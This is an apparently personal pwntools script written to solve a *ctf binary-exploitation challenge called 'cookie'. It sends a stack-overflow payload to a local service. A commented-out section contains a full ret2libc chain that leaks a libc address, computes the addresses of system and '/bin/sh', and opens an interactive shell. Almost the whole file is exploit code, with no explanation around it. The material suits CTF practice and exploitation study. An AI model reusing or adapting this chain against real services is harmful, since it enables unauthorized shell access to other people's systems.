#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
to solve *ctf cookie
"""
import time
from pwn import *

elf = ELF("./level6-cookie")
libc = ELF("./libc-2.23.so")

sh_addr = list(libc.search("/bin/sh"))[0]
execve_addr = libc.sym["system"]

r = remote("0.0.0.0",0x2716)

w = r.recv()
print w
w = r.recv()
payload = 'a'*0x40 #+ 'a'*0x1c #'a'*0x4c + 'a'*4 #+ p32(elf.plt['send']) #+p32(0x8048bb7)#+p32(fd) + p32(elf.got['recv']) + p32(4) + p32(0)
r.send(payload)
r.recv()
'''
for i in range(0x444):
     rr = remote("0.0.0.0",0x2716) 
     rr.sendline(i*'a')
     time.sleep(0.1)
     print i
     '''
'''
base_str = r.recv()
word1 = base_str
print word1
print len(word1)

word1 = word1[:4]
word1 = word1[::-1]
word1 = word1.encode('hex')
word1 = int(word1, 16)
print hex(word1)

base_addr = word1 - libc.sym['recv']

execve_actu = base_addr + execve_addr
sh_actu = base_addr + sh_addr

payload2 = 'a'*0x4c + 'a'*4 + p32(execve_actu)+p32(9) + p32(sh_actu)


r.sendline(payload2)
w = r.recv()
print w
r.interactive()
'''
